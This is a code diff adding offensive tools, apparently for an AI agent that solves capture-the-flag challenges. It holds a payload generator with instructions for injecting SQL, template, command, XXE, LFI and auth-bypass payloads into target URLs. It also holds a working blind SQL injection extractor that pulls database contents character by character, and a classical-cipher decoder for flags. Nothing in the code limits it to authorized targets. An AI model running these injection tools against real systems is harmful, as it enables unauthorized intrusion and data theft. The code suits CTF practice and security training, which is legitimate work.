+            cats.append({"category": k, "description": desc, "count": len(_PAYLOAD_CATEGORIES[k][1])})
+        return {
+            "success": True,
+            "category": "list",
+            "categories": cats,
+            "usage_hint": (
+                "调用 payload_gen(category='xxx') 获取payload列表，"
+                "然后用 http_raw 逐个测试，无需写Python循环代码。"
+                "示例：payload_gen(category='ip_bypass') 返回IP伪造头列表，"
+                "然后对每个headers调用 http_raw(url=..., headers=payload['headers'])"
+            ),
+        }
+
+    if category not in _PAYLOAD_CATEGORIES:
+        return {
+            "success": False,
+            "error": f"未知类别: {category}",
+            "available_categories": list(_PAYLOAD_CATEGORIES.keys()),
+            "hint": "传 category='list' 查看所有可用类别",
+        }
+
+    desc, payloads = _PAYLOAD_CATEGORIES[category]
+    result_payloads = list(payloads)
+
+    # 合并自定义payload
+    if custom_data:
+        custom_lines = [line.strip() for line in custom_data.split("\n") if line.strip()]
+        for i, line in enumerate(custom_lines):
+            custom_entry = {"name": f"custom_{i+1}", "value": line}
+            # 根据类别决定字段名
+            if category == "ip_bypass":
+                custom_entry["headers"] = line
+            elif category == "ua_bypass":
+                custom_entry["ua"] = line
+            elif category in ("lfi_paths", "dir_wordlist", "sqli", "ssti", "cmdi", "xss"):
+                custom_entry["value"] = line
+            result_payloads.append(custom_entry)
+
+    # 构造使用提示
+    usage_hints = {
+        "ip_bypass": "对每个payload调用 http_raw(url=目标URL, headers=payload['headers']) 测试。重点关注响应状态码和内容长度变化。",
+        "ua_bypass": "对每个payload调用 http_raw(url=目标URL, headers='User-Agent: '+payload['ua']) 测试。重点关注响应内容差异。",
+        "lfi_paths": "对每个payload调用 http_raw(url=目标URL+'?file='+payload) 或 http_raw(url=目标URL+payload) 测试。注意base64编码的响应需要解码。",
+        "dir_wordlist": "对每个payload调用 http_raw(url=目标基础URL+'/'+payload) 测试。重点关注200/403响应。",
+        "sqli": "对每个payload注入到参数中，用 http_raw(url=目标URL+'?id='+payload) 测试。注意URL编码。",
+        "ssti": "对每个payload注入到参数中，用 http_raw(url=目标URL+'?name='+payload) 测试。重点看49、777777等运算结果。",
+        "cmdi": "对每个payload注入到参数中，用 http_raw(url=目标URL+'?cmd='+payload) 测试。注意URL编码特殊字符。",
+        "xxe": "用 http_raw(url=目标URL, method='POST', headers='Content-Type: application/xml', body=payload) 测试。",
+        "deserialize": "查看payload中的类名和说明，构造对应的反序列化字符串。配合php_deserialize_generate或python_pickle_generate使用。",
+        "auth_bypass": "对每个payload调用 http_raw(url=登录URL, method='POST', body='username='+payload['user']+'&password='+payload['pass']) 测试。",
+        "xss": "对每个payload注入到参数中测试。重点看响应中payload是否原样返回。",
+    }
+
+    return {
+        "success": True,
+        "category": category,
+        "description": desc,
+        "count": len(result_payloads),
+        "payloads": result_payloads,
+        "usage_hint": usage_hints.get(category, "配合http_raw工具逐个测试payload。"),
+    }
+
+
+# === SQL盲注自动化提取工具（解决AI逐字符提取消耗大量迭代的问题）===
+async def sqli_blind_extract(
+    url: str,
+    inject_param: str = "",
+    true_marker: str = "",
+    false_marker: str = "",
+    query_template: str = "",
+    method: str = "GET",
+    body: str = "",
+    headers: str = "",
+    data_length: int = 0,
+    charset: str = "",
+    max_length: int = 100,
+    timeout: int = 5
+) -> Dict[str, Any]:
+    """SQL盲注自动化提取数据（布尔盲注）
+
+    通过二分查找逐字符提取数据，一次调用完成全部提取。
+    解决AI用execute_python写盲注脚本被截断、消耗大量迭代的问题。
+
+    Args:
+        url: 目标URL (如 http://target/api/lookup.php?code=INJECT_HERE)
+        inject_param: 注入点参数名(如 code)。如果URL中含INJECT_HERE则直接替换
+        true_marker: 布尔为真时响应中的标志字符串(如 "found":true 或 "exists")
+        false_marker: 布尔为假时响应中的标志字符串(如 "found":false)。可选，不填则用true_marker取反
+        query_template: SQL注入模板，用{pos}表示字符位置，{char}表示ASCII码比较值
+                       如: "x' OR (SELECT ASCII(SUBSTR(body,{pos},1)) FROM records WHERE is_public=false)>{char}--"
+                       或PostgreSQL: "x' OR (SELECT ASCII(SUBSTRING(body,{pos},1)) FROM records WHERE is_public=false)>{char}--"
+        method: GET或POST
+        body: POST时的请求体模板，含INJECT_HERE占位符
+        headers: 自定义headers (JSON字符串或Key: Value\\n格式)
+        data_length: 已知数据长度(如通过之前的盲注已确认=43)。0表示自动检测
+        charset: 限定字符集(如 "abcdef0123456789{}")，加速提取。空字符串则尝试全部可打印ASCII
+        max_length: 最大提取长度(防止无限提取)，默认100
+        timeout: 每个请求的超时秒数，默认5
+
+    Returns:
+        dict: {success, extracted_data, length, requests_count, elapsed}
+    """
+    import aiohttp
+    import time
+    import urllib.parse
+    import json as json_mod
+
+    start_time = time.time()
+    requests_count = 0
+
+    # 解析headers
+    parsed_headers = {"User-Agent": "Mozilla/5.0"}
+    if headers:
+        try:
+            parsed_headers = json_mod.loads(headers)
+        except json_mod.JSONDecodeError:
+            for line in headers.split("\n"):
+                if ":" in line:
+                    k, v = line.split(":", 1)
+                    parsed_headers[k.strip()] = v.strip()
+
+    async def make_request(payload: str) -> str:
+        """发送注入请求，返回响应文本"""
+        nonlocal requests_count
+        requests_count += 1
+
+        # 构造实际URL
+        if "INJECT_HERE" in url:
+            actual_url = url.replace("INJECT_HERE", urllib.parse.quote(payload))
+        elif inject_param:
+            sep = "&" if "?" in url else "?"
+            actual_url = f"{url}{sep}{inject_param}={urllib.parse.quote(payload)}"
+        else:
+            actual_url = url
+
+        try:
+            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=timeout)) as session:
+                if method.upper() == "POST":
+                    post_data = body.replace("INJECT_HERE", payload) if body else payload
+                    async with session.post(actual_url, data=post_data, headers=parsed_headers, allow_redirects=False) as resp:
+                        return await resp.text()
+                else:
+                    async with session.get(actual_url, headers=parsed_headers, allow_redirects=False) as resp:
+                        return await resp.text()
+        except Exception as e:
+            return ""
+
+    def is_true(response_text: str) -> bool:
+        """判断响应是否表示布尔为真"""
+        if true_marker and true_marker in response_text:
+            return True
+        if false_marker and false_marker not in response_text:
+            return True
+        if true_marker and true_marker not in response_text:
+            return False
+        # 没有明确marker时无法判断
+        return false_marker == "" and len(response_text) > 0
+
+    try:
+        # 1. 确定数据长度
+        if data_length == 0:
+            logger.info("自动检测数据长度...")
+            for length in range(1, max_length + 1):
+                payload = query_template.replace("{pos}", str(length)).replace("{char}", "0")
+                # 测试 length(body) > length
+                # 构造长度测试payload
+                length_query = f"x' OR length(({query_template.split('OR')[1].split('>{')[0].strip()}))>{length}--"
+                # 简化：直接用模板测试位置length是否存在
+                test_payload = query_template.replace("{pos}", str(length)).replace("{char}", "32")  # 空格以上
+                resp = await make_request(test_payload)
+                if not is_true(resp):
+                    data_length = length - 1
+                    break
+            else:
+                data_length = max_length
+            logger.info(f"数据长度: {data_length}")
+
+        if data_length == 0:
+            return {"success": False, "error": "无法确定数据长度", "requests_count": requests_count}
+
+        # 2. 逐字符二分查找提取
+        extracted = ""
+        # 默认字符集：可打印ASCII
+        if not charset:
+            # 先尝试常见flag字符集，加速
+            fast_charset = "abcdefghijklmnopqrstuvwxyz0123456789_{}-ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*().,;:"
+        else:
+            fast_charset = charset
+
+        for pos in range(1, data_length + 1):
+            # 二分查找ASCII码
+            low, high = 32, 126  # 可打印ASCII范围
+
+            while low < high:
+                mid = (low + high) // 2
+                payload = query_template.replace("{pos}", str(pos)).replace("{char}", str(mid))
+                resp = await make_request(payload)
+
+                if is_true(resp):
+                    low = mid + 1
+                else:
+                    high = mid
+
+            char = chr(low)
+            extracted += char
+            logger.debug(f"位置{pos}: '{char}' (ASCII={low}), 累计: {extracted}")
+
+            # 如果已知前缀且当前字符不匹配，可能是字符集范围不够
+            if low > 126 or low < 32:
+                logger.warning(f"位置{pos}: 非可打印字符(ASCII={low})，尝试扩展范围")
+                # 尝试0-255
+                low2, high2 = 0, 255
+                while low2 < high2:
+                    mid = (low2 + high2) // 2
+                    payload = query_template.replace("{pos}", str(pos)).replace("{char}", str(mid))
+                    resp = await make_request(payload)
+                    if is_true(resp):
+                        low2 = mid + 1
+                    else:
+                        high2 = mid
+                char = chr(low2)
+                extracted = extracted[:-1] + char
+
+        elapsed = round(time.time() - start_time, 2)
+        logger.info(f"SQL盲注提取完成: '{extracted}' (长度={len(extracted)}, 请求={requests_count}次, 耗时={elapsed}s)")
+
+        return {
+            "success": True,
+            "extracted_data": extracted,
+            "length": len(extracted),
+            "requests_count": requests_count,
+            "elapsed": elapsed,
+        }
+
+    except Exception as e:
+        elapsed = round(time.time() - start_time, 2)
+        logger.error(f"SQL盲注提取失败: {e}")
+        return {
+            "success": False,
+            "error": str(e),
+            "extracted_data": extracted if 'extracted' in dir() else "",
+            "requests_count": requests_count,
+            "elapsed": elapsed,
+        }
+
+
+# === 密码自动分析解密工具（解决AI无法快速识别加密方式的问题）===
+async def crypto_decode_all(data: str, known_prefix: str = "", known_format: str = "") -> Dict[str, Any]:
+    """自动尝试常见CTF密码学解密方法
+
+    对输入数据尝试所有常见解密方法，返回所有可能的结果。
+    解决AI需要多次迭代尝试不同解密方法的问题。
+
+    Args:
+        data: 待解密的字符串(如 flst{ujufylksinqnke4m)
+        known_prefix: 已知明文前缀(如 flag{)，用于验证解密结果
+        known_format: 已知格式(如 flag{...}，ctf{...}，NSSCTF{...})
+
+    Returns:
+        dict: {success, results: [{method, decoded, match}], best_match, suggestion}
+    """
+    import string
+    import base64
+    import binascii
+
+    results = []
+    data = data.strip()
+
+    if not data:
+        return {"success": False, "error": "输入数据为空"}
+
+    # 1. 凯撒密码（所有25种位移）
+    for shift in range(1, 26):
+        decoded = ""
+        for c in data:
+            if c.isalpha():
+                base = ord('a') if c.islower() else ord('A')
+                decoded += chr((ord(c) - base - shift) % 26 + base)
+            else:
+                decoded += c
+        results.append({
+            "method": f"caesar_shift_-{shift}",
+            "decoded": decoded,
+            "match": known_prefix.lower() in decoded.lower() if known_prefix else False,
+        })
+        # 反向也试
+        decoded_rev = ""
+        for c in data:
+            if c.isalpha():
+                base = ord('a') if c.islower() else ord('A')
+                decoded_rev += chr((ord(c) - base + shift) % 26 + base)
+            else:
+                decoded_rev += c
+        results.append({
+            "method": f"caesar_shift_+{shift}",
+            "decoded": decoded_rev,
+            "match": known_prefix.lower() in decoded_rev.lower() if known_prefix else False,
+        })
+
+    # 2. ROT13
+    rot13 = ""
+    for c in data:
+        if c.isalpha():
+            base = ord('a') if c.islower() else ord('A')
+            rot13 += chr((ord(c) - base + 13) % 26 + base)
+        else:
+            rot13 += c
+    results.append({
+        "method": "rot13",
+        "decoded": rot13,
+        "match": known_prefix.lower() in rot13.lower() if known_prefix else False,
+    })
+
+    # 3. ROT47
+    rot47 = ""
+    for c in data:
+        o = ord(c)
+        if 33 <= o <= 126:
+            rot47 += chr(33 + (o - 33 + 47) % 94)
+        else:
+            rot47 += c
+    results.append({
+        "method": "rot47",
+        "decoded": rot47,
+        "match": known_prefix.lower() in rot47.lower() if known_prefix else False,
+    })
+
+    # 4. Atbash（字母反转 a↔z, A↔Z）
+    atbash = ""
+    for c in data:
+        if c.islower():
+            atbash += chr(ord('z') - (ord(c) - ord('a')))
+        elif c.isupper():
+            atbash += chr(ord('Z') - (ord(c) - ord('A')))
+        else:
+            atbash += c
+    results.append({
+        "method": "atbash",
+        "decoded": atbash,
+        "match": known_prefix.lower() in atbash.lower() if known_prefix else False,
+    })
+
+    # 5. Base64解码
+    try:
+        # 自动补齐padding
+        padded = data + "=" * (4 - len(data) % 4) if len(data) % 4 else data
+        b64_decoded = base64.b64decode(padded).decode("utf-8", errors="ignore")
+        if b64_decoded and all(c.isprintable() or c in "\n\r\t" for c in b64_decoded):
+            results.append({
+                "method": "base64_decode",
+                "decoded": b64_decoded,
+                "match": known_prefix.lower() in b64_decoded.lower() if known_prefix else False,
+            })
+    except Exception:
+        pass
+
+    # 6. Base32解码
+    try:
+        padded = data.upper() + "=" * (8 - len(data) % 8) if len(data) % 8 else data.upper()
+        b32_decoded = base64.b32decode(padded).decode("utf-8", errors="ignore")
+        if b32_decoded and all(c.isprintable() or c in "\n\r\t" for c in b32_decoded):
+            results.append({
+                "method": "base32_decode",
+                "decoded": b32_decoded,
+                "match": known_prefix.lower() in b32_decoded.lower() if known_prefix else False,
+            })
+    except Exception:
+        pass
+
+    # 7. Hex解码
+    try:
+        hex_decoded = bytes.fromhex(data).decode("utf-8", errors="ignore")
+        if hex_decoded and all(c.isprintable() or c in "\n\r\t" for c in hex_decoded):
+            results.append({
+                "method": "hex_decode",
+                "decoded": hex_decoded,
+                "match": known_prefix.lower() in hex_decoded.lower() if known_prefix else False,
+            })
+    except Exception:
+        pass
+
+    # 8. URL解码
+    try:
+        from urllib.parse import unquote
+        url_decoded = unquote(data)
+        if url_decoded != data:
+            results.append({
+                "method": "url_decode",
+                "decoded": url_decoded,
+                "match": known_prefix.lower() in url_decoded.lower() if known_prefix else False,
+            })
+    except Exception:
+        pass
+
+    # 9. 字母数字位移分析（如 flst→flag 是每个字母+1/+2等）
+    # 检测是否是固定位移：flst vs flag
+    if known_prefix and len(data) >= len(known_prefix):
+        prefix_data = data[:len(known_prefix)]
+        shifts = []
+        consistent = True
+        for i in range(len(known_prefix)):
+            if prefix_data[i].isalpha() and known_prefix[i].isalpha():
+                s = (ord(known_prefix[i].lower()) - ord(prefix_data[i].lower())) % 26
+                shifts.append(s)
+            else:
+                shifts.append(0)
+
+        if shifts and len(set(shifts)) == 1 and shifts[0] != 0:
+            # 固定位移！
+            shift = shifts[0]
+            decoded = ""
+            for c in data:
+                if c.isalpha():
+                    base = ord('a') if c.islower() else ord('A')
+                    decoded += chr((ord(c) - base + shift) % 26 + base)
+                else:
+                    decoded += c
+            results.append({
+                "method": f"fixed_shift_+{shift} (detected from prefix '{prefix_data}'→'{known_prefix}')",
+                "decoded": decoded,
+                "match": True,
+            })
+        elif len(set(shifts)) > 1:
+            # 非固定位移，可能是Vigenere或其他
+            # 尝试Vigenere解密，key从已知前缀推导
+            # 注意：key只包含字母字符对应的位移，非字母字符（如{）不加入key
+            key = ""
+            for i in range(len(known_prefix)):
+                if prefix_data[i].isalpha() and known_prefix[i].isalpha():
+                    k = (ord(known_prefix[i].lower()) - ord(prefix_data[i].lower())) % 26
+                    key += chr(k + ord('a'))
+                # 非字母字符不加入key，避免污染位移循环
+
+            if key:
+                decoded = ""
+                ki = 0
+                for c in data:
+                    if c.isalpha():
+                        base = ord('a') if c.islower() else ord('A')
+                        k = ord(key[ki % len(key)].lower()) - ord('a')
+                        decoded += chr((ord(c) - base + k) % 26 + base)
+                        ki += 1
+                    else:
+                        decoded += c
+                results.append({
+                    "method": f"vigenere_key='{key}' (derived from prefix, non-alpha chars excluded from key)",
+                    "decoded": decoded,
+                    "match": True,
+                })
+
+    # 10. 字母序号分析（A=1, B=2, ...）
+    # 11. Morse码解码（简单检测）
+    if "." in data and "-" in data:
+        morse_map = {
+            ".-": "A", "-...": "B", "-.-.": "C", "-..": "D", ".": "E",
+            "..-.": "F", "--.": "G", "....": "H", "..": "I", ".---": "J",
+            "-.-": "K", ".-..": "L", "--": "M", "-.": "N", "---": "O",
+            ".--.": "P", "--.-": "Q", ".-.": "R", "...": "S", "-": "T",
+            "..-": "U", "...-": "V", ".--": "W", "-..-": "X", "-.--": "Y",
+            "--..": "Z", "-----": "0", ".----": "1", "..---": "2", "...--": "3",
+            "....-": "4", ".....": "5", "-....": "6", "--...": "7", "---..": "8", "----.": "9",
+        }
+        words = data.split("/")
+        decoded_morse = ""
+        for word in words:
+            for code in word.split():
+                if code in morse_map:
+                    decoded_morse += morse_map[code]
+            decoded_morse += " "
+        decoded_morse = decoded_morse.strip()
+        if decoded_morse:
+            results.append({
+                "method": "morse_decode",
+                "decoded": decoded_morse,
+                "match": known_prefix.lower() in decoded_morse.lower() if known_prefix else False,
+            })
+
+    # 12. 培根密码（5位AB组合）
+    if len(data) >= 5 and all(c.lower() in "ab " for c in data):
+        bacon_map = {
+            "AAAAA": "A", "AAAAB": "B", "AAABA": "C", "AAABB": "D", "AABAA": "E",
+            "AABAB": "F", "AABBA": "G", "AABBB": "H", "ABAAA": "I", "ABAAB": "J",
+            "ABABA": "K", "ABABB": "L", "ABBAA": "M", "ABBAB": "N", "ABBBA": "O",
+            "ABBBB": "P", "BAAAA": "Q", "BAAAB": "R", "BAABA": "S", "BAABB": "T",
+            "BABAA": "U", "BABAB": "V", "BABBA": "W", "BABBB": "X", "BBAAA": "Y", "BBAAB": "Z",
+        }
+        cleaned = data.replace(" ", "").upper()
+        bacon_decoded = ""
+        for i in range(0, len(cleaned) - 4, 5):
+            chunk = cleaned[i:i+5]
+            if chunk in bacon_map:
+                bacon_decoded += bacon_map[chunk]
+        if bacon_decoded:
+            results.append({
+                "method": "bacon_decode",
+                "decoded": bacon_decoded,
+                "match": known_prefix.lower() in bacon_decoded.lower() if known_prefix else False,
+            })
+
+    # 筛选最佳匹配
+    matches = [r for r in results if r["match"]]
+    best_match = matches[0] if matches else None
+
+    # 如果没有精确匹配，找最像flag的
+    if not best_match:
+        for r in results:
+            decoded = r["decoded"]
+            if known_format and known_format.lower() in decoded.lower():
+                best_match = r
+                break
+            # 检查是否包含常见flag格式
+            for fmt in ["flag{", "ctf{", "nssctf{", "fsctf{", "key{"]:
+                if fmt in decoded.lower():
+                    best_match = r
+                    break
+            if best_match:
+                break
+
+    suggestion = ""
+    if best_match:
+        suggestion = f"最佳匹配: {best_match['method']} → {best_match['decoded']}"
+    else:
+        # 分析位移模式
+        if known_prefix and len(data) >= len(known_prefix):
+            prefix_data = data[:len(known_prefix)]
+            shifts = []
+            for i in range(len(known_prefix)):
+                if prefix_data[i].isalpha() and known_prefix[i].isalpha():
+                    s = (ord(known_prefix[i].lower()) - ord(prefix_data[i].lower())) % 26
+                    shifts.append(s)
+            if shifts:
+                if len(set(shifts)) == 1:
+                    suggestion = f"检测到固定位移: {shifts[0]}，已用caesar_shift_+{shifts[0]}解密"
+                else:
+                    suggestion = f"检测到非固定位移({shifts})，可能是Vigenere密码，已尝试推导密钥"
+            else:
+                suggestion = "未找到匹配，可能需要自定义解密逻辑"
+        else:
+            suggestion = "未提供已知前缀，无法精确匹配。建议提供known_prefix参数(如flag{)以获得更好结果"
+
+    return {
+        "success": True,
+        "input": data,
+        "known_prefix": known_prefix,
+        "total_methods_tried": len(results),
+        "results": results,
+        "best_match": best_match,
+        "suggestion": suggestion,
+    }
